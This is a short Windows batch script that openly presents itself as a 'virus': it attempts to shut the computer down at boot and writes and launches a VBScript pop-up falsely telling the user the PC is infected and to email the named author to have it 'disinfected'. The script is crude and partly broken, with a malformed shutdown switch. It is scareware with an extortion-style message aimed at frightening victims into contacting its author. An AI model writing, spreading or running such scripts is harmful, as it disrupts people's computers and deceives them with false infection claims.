:: Disabling the console.
@echo off

:: Virus command is to shutdown the computer when it boots up.

shutdown \s


FOR /L %%y IN (0, 1, 3) DO echo x=msgbox("Virus has infected your pc contact virus author to disinfect your pc, Email id: baldiwalaazim@gmail.com", 16, "Virus has infected your pc contact virus author to disinfect your pc, Email id: baldiwalaazim@gmail.com") >> msgbox.vbs

PAUSE

start msgbox.vbs
